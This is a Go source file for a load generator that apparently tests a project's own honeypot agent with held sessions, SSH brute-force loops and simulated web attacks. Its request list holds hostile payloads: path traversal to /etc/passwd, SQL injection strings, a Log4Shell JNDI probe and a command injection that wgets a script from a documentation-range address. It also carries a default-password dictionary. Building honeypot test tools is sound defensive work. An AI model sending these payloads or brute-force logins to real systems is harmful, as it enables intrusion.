// Command loadgen is a load generator for the honeypot agent: a test tool only, not part of the
// agent image, to be pointed only at our own honeypot. The agent allows 10 connections per IP,
// so for more load run several copies, each in its own container/IP (README, "Load testing").
package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	host = flag.String("host", "honeypot-agent", "agent host name")
	mode = flag.String("mode", "hold", "hold = keep -n logged-in sessions open on every service; "+
		"brute = -n parallel SSH brute-force loops (full handshake + wrong password); "+
		"http = -n parallel loops of varied web attacks (logins, scanners, exploits)")
	n       = flag.Int("n", 10, "sessions per service (hold) or parallel loops (brute, http)")
	seconds = flag.Int("seconds", 25, "how long to hold the sessions or run the loops")
)

// result counts what happened to the sessions of one service.
type result struct {
	ok     atomic.Int64 // opened and still open at the end
	closed atomic.Int64 // opened, but the server closed it before the end (a timeout)
	failed atomic.Int64 // could not connect or log in (for example, a connection limit was hit)
}

// Filled once here and only read afterwards, so goroutines can share the map safely.
var results = map[string]*result{"ssh": {}, "telnet": {}, "ftp": {}, "http": {}}

func main() {
	flag.Parse()
	duration := time.Duration(*seconds) * time.Second

	switch *mode {
	case "brute":
		runBrute(duration)
		return
	case "http":
		runHTTP(duration)
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < *n; i++ {
		wg.Add(4)
		go func() { defer wg.Done(); holdSSH(duration) }()
		go func() {
			defer wg.Done()
			holdTCP("telnet", "2323", duration, "root\r\n", "root\r\n", "uname -a; ls /\r\n")
		}()
		go func() { defer wg.Done(); holdTCP("ftp", "2121", duration, "USER root\r\n", "PASS root\r\n") }()
		go func() {
			defer wg.Done()
			holdTCP("http", "8080", duration, "GET / HTTP/1.1\r\nHost: gateway\r\n\r\n")
		}()
	}
	wg.Wait()

	var parts []string
	for _, name := range []string{"ssh", "telnet", "ftp", "http"} {
		r := results[name]
		parts = append(parts, fmt.Sprintf("%s ok=%d closed=%d failed=%d", name, r.ok.Load(), r.closed.Load(), r.failed.Load()))
	}
	fmt.Printf("hold %s: %s\n", duration, strings.Join(parts, " | "))
}

// holdTCP connects to a text service, sends each line after reading the server's answer,
// keeps the connection open for d, then checks whether it is still open.
func holdTCP(name, port string, d time.Duration, lines ...string) {
	r := results[name]
	c, err := net.DialTimeout("tcp", net.JoinHostPort(*host, port), 10*time.Second)
	if err != nil {
		r.failed.Add(1)
		return
	}
	defer c.Close()

	// Read whatever the server sends. A timeout is fine (the server is waiting for us);
	// any other error means the server closed the connection.
	buf := make([]byte, 4096)
	read := func(wait time.Duration) error {
		c.SetReadDeadline(time.Now().Add(wait))
		_, err := c.Read(buf)
		if errors.Is(err, os.ErrDeadlineExceeded) {
			return nil
		}
		return err
	}

	if err := read(1500 * time.Millisecond); err != nil {
		r.failed.Add(1)
		return
	}
	for _, line := range lines {
		if _, err := c.Write([]byte(line)); err != nil {
			r.failed.Add(1)
			return
		}
		if err := read(1500 * time.Millisecond); err != nil {
			r.failed.Add(1)
			return
		}
	}

	time.Sleep(d)
	// Output the server sent meanwhile may still be buffered: read all of it first, so a closed
	// connection shows up as an error (EOF) and not as leftover data.
	for {
		c.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		if _, err := c.Read(buf); err != nil {
			if errors.Is(err, os.ErrDeadlineExceeded) {
				r.ok.Add(1) // nothing more to read and no error: still open
			} else {
				r.closed.Add(1)
			}
			return
		}
	}
}

// holdSSH logs in over SSH, starts a shell with a few commands, keeps the session for d,
// then checks whether it is still open.
func holdSSH(d time.Duration) {
	r := results["ssh"]
	client, err := ssh.Dial("tcp", net.JoinHostPort(*host, "2222"), sshConfig("root"))
	if err != nil {
		r.failed.Add(1)
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		r.failed.Add(1)
		return
	}
	stdin, err := session.StdinPipe()
	if err != nil {
		r.failed.Add(1)
		return
	}
	if err := session.RequestPty("xterm", 24, 80, ssh.TerminalModes{}); err != nil {
		r.failed.Add(1)
		return
	}
	if err := session.Shell(); err != nil {
		r.failed.Add(1)
		return
	}
	stdin.Write([]byte("uname -a; cat /proc/cpuinfo; ls -la /\n"))

	time.Sleep(d)
	// A request the server answers only if the connection is still alive.
	if _, _, err := client.SendRequest("keepalive@openssh.com", true, nil); err != nil {
		r.closed.Add(1)
		return
	}
	r.ok.Add(1)
}

// runBrute runs n parallel loops of SSH logins with a wrong password until d has passed.
func runBrute(d time.Duration) {
	var rejected, errs atomic.Int64
	stop := time.Now().Add(d)

	var wg sync.WaitGroup
	for i := 0; i < *n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				client, err := ssh.Dial("tcp", net.JoinHostPort(*host, "2222"), sshConfig("wrong-password"))
				switch {
				case err == nil: // should never happen
					client.Close()
					errs.Add(1)
				case strings.Contains(err.Error(), "unable to authenticate"):
					rejected.Add(1) // expected: full handshake, then the password was refused
				default:
					errs.Add(1) // connection refused, limit hit, timeout...
					// like the http mode: retrying at once would be thousands of refused connections a
					// second (a wrong password takes only ~300ms, the agent frees the place after 1s)
					time.Sleep(time.Second)
				}
			}
		}()
	}
	wg.Wait()

	total := rejected.Load()
	fmt.Printf("brute %s: ssh logins rejected=%d (%.0f/s) errors=%d\n", d, total, float64(total)/d.Seconds(), errs.Load())
}

// webRequest is one request of the http mode and the status the agent should answer with
// (the agent imitates lighttpd: see internal/services/http.go).
type webRequest struct {
	method, path         string
	form                 string // body of a POST login form
	basicUser, basicPass string // Basic Auth, when basicUser is set
	login                bool   // carries a password: the agent logs it as a login_attempt
	want                 int
}

// Dictionaries of the http mode. Every address in a payload is in 203.0.113.0/24, a range kept
// for documentation (RFC 5737): nothing real is ever behind it.
var (
	webUsers     = []string{"admin", "root", "user", "support", "guest", "Admin"}
	webPasswords = []string{"admin", "password", "1234", "12345", "123456", "root", "default", "admin123", "gateway"}
	userAgents   = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"curl/7.88.1",
		"python-requests/2.31.0",
		"Go-http-client/1.1",
		"Mozilla/5.0 zgrab/0.x",
		"Hello, world",
		"", // no User-Agent header at all, like some bots
	}

	// login forms of different targets, with the field names their bots use
	loginForms = []struct {
		path, userField, passField, extra string
		want                              int
	}{
		{"/login.cgi", "username", "password", "", 401},              // this router's own form
		{"/cgi-bin/login.cgi", "user", "pass", "&submit=Login", 404}, // another vendor's router
		{"/wp-login.php", "log", "pwd", "&wp-submit=Log+In", 404},    // WordPress
	}

	// logins with the password in the URL, common in IoT exploits
	urlLogins = []struct {
		path, userField, passField string
		want                       int
	}{
		{"/login.cgi", "user", "pwd", 401},
		{"/goform/login", "username", "password", 404},
	}

	basicPaths = []string{"/", "/cgi-bin/", "/admin/", "/HNAP1/"} // Basic Auth: 401 on any path

	scanPaths = []struct {
		path string
		want int
	}{
		{"/", 200},
		{"/index.html", 200},
		{"/login.cgi", 200}, // without a password the CGI shows the form
		{"/favicon.ico", 404},
		{"/robots.txt", 404},
		{"/.env", 404},
		{"/.git/config", 404},
		{"/wp-login.php", 404},
		{"/phpmyadmin/", 404},
		{"/actuator/health", 404},
		{"/HNAP1/", 404},
		{"/shell.php?cmd=id", 404},
		{"/cgi-bin/../../../../etc/passwd", 404},            // path traversal
		{"/index.php?id=1%27%20or%20%271%27=%271", 404},     // SQL injection
		{"/index.php?id=1%20union%20select%201,2,3--", 404}, // SQL injection
		{"/?x=${jndi:ldap://203.0.113.5:1389/a}", 200},      // Log4Shell probe
		{"/setup.cgi?todo=syscmd&cmd=wget+http://203.0.113.5/x.sh+-O+/tmp/x", 404}, // command injection
	}
)

// pick returns a random element of list. [T any] makes it a generic function: one function
// for lists of any type (strings, structs...), still checked by the compiler.
func pick[T any](list []T) T {
	return list[rand.IntN(len(list))]
}

// One function per kind of bot: each returns a new random request of its kind.
var bots = []func() webRequest{
	func() webRequest { // POST to a login form
		f := pick(loginForms)
		form := f.userField + "=" + url.QueryEscape(pick(webUsers)) + "&" +
			f.passField + "=" + url.QueryEscape(pick(webPasswords)) + f.extra
		return webRequest{method: "POST", path: f.path, form: form, login: true, want: f.want}
	},
	func() webRequest { // Basic Auth
		return webRequest{method: "GET", path: pick(basicPaths), basicUser: pick(webUsers),
			basicPass: pick(webPasswords), login: true, want: 401}
	},
	func() webRequest { // password in the URL
		l := pick(urlLogins)
		path := l.path + "?" + l.userField + "=" + url.QueryEscape(pick(webUsers)) + "&" +
			l.passField + "=" + url.QueryEscape(pick(webPasswords))
		return webRequest{method: "GET", path: path, login: true, want: l.want}
	},
	func() webRequest { // scanner looking for known files and holes
		s := pick(scanPaths)
		return webRequest{method: "GET", path: s.path, want: s.want}
	},
}

// runHTTP runs n parallel loops of web attacks until d has passed. Each loop is one bot at a
// time: a visit = one kind of bot sending 1-5 requests on one keep-alive connection (one
// session_id at the agent), then it leaves and the next visit opens a new connection.
func runHTTP(d time.Duration) {
	var requests, logins, unexpected, errs atomic.Int64
	var firstWrong, firstErr string  // the first of each, to show what went wrong
	var wrongOnce, errOnce sync.Once // sync.Once: only the first goroutine gets to write
	stop := time.Now().Add(d)

	var wg sync.WaitGroup
	for range *n {
		wg.Add(1)
		go func() {
			defer wg.Done()
			// Its own Transport (= its own pool of connections) for every loop: at most one
			// connection per loop, so n loops stay within the agent's 10 per IP.
			client := &http.Client{Transport: &http.Transport{}, Timeout: 10 * time.Second}
			for time.Now().Before(stop) {
				bot, agent := pick(bots), pick(userAgents)
				for range 1 + rand.IntN(5) {
					r := bot()
					status, err := send(client, r, agent)
					if err != nil {
						errs.Add(1) // no answer: the agent refused the connection (limit), timeout...
						errOnce.Do(func() { firstErr = err.Error() })
						// like a bot: give up this visit and wait before coming back. Without the
						// pause the loop would retry thousands of times a second (measured: 227k
						// refused connections in 10s from 20 copies, the agent busy just refusing)
						time.Sleep(time.Second)
						break
					}
					// answered = the agent logged it: the sum over all copies = its number of HTTP events
					requests.Add(1)
					if r.login {
						logins.Add(1)
					}
					if status != r.want {
						unexpected.Add(1)
						wrongOnce.Do(func() { firstWrong = fmt.Sprintf("%s %s -> %d, want %d", r.method, r.path, status, r.want) })
					}
				}
				client.CloseIdleConnections() // the bot leaves: the next visit is a new connection
			}
		}()
	}
	wg.Wait()

	total := requests.Load()
	fmt.Printf("http %s: requests=%d (%.0f/s) logins=%d unexpected=%d errors=%d\n",
		d, total, float64(total)/d.Seconds(), logins.Load(), unexpected.Load(), errs.Load())
	if firstWrong != "" {
		fmt.Println("first unexpected answer:", firstWrong)
	}
	if firstErr != "" {
		fmt.Println("first error:", firstErr)
	}
}

// send makes one request and returns the status the agent answered with.
func send(client *http.Client, r webRequest, userAgent string) (int, error) {
	var body io.Reader // stays nil (no body) for a GET
	if r.form != "" {
		body = strings.NewReader(r.form)
	}
	req, err := http.NewRequest(r.method, "http://"+net.JoinHostPort(*host, "8080")+r.path, body)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", userAgent) // "" = Go sends no User-Agent header
	if r.form != "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if r.basicUser != "" {
		req.SetBasicAuth(r.basicUser, r.basicPass)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body) // read the whole answer, otherwise the connection can't be reused
	resp.Body.Close()
	return resp.StatusCode, nil
}

func sshConfig(password string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{ssh.Password(password)},
		// Test tool talking to our own honeypot: the host key does not matter here.
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         15 * time.Second,
	}
}
